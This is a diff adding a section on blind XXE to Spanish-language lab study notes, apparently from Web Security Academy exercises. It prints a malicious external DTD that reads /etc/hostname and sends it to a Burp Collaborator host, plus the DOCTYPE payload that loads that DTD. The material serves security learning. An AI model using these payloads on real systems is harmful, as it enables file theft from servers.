@@ -180,7 +180,30 @@ exfiliar informacion.
   
   ```
   
+  # Exploiting blind XXE to exfiltrate data using a malicious external DTD
   
+  Para este ejercicio se va a tomar un DTD de un servidor externo. Primero se declara en el servidor que aloja el dtd malicioso
+  
+  ```
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+  
+  NOTA: El metodo alternativo es el que se llama eval y exfil directamente desde burp
+  
+  ```
+  
+  En la peticiond e burp:
+  
+ 
+  ```
+<!DOCTYPE foo [<!ENTITY % loadDtd SYSTEM "https://exploit-0ad800db03236715c0af66bb013a0064.web-security-academy.net/exploit"> %loadDtd;
+%eval;
+%exfil;// eSTO ES PARTE DE LA SOLCION ALTERNA  EL PRIMER METODO SOLO LLEVARIA EL %loadDtd;
+]>
+  
+  ```
   
   
 ***Referencias***
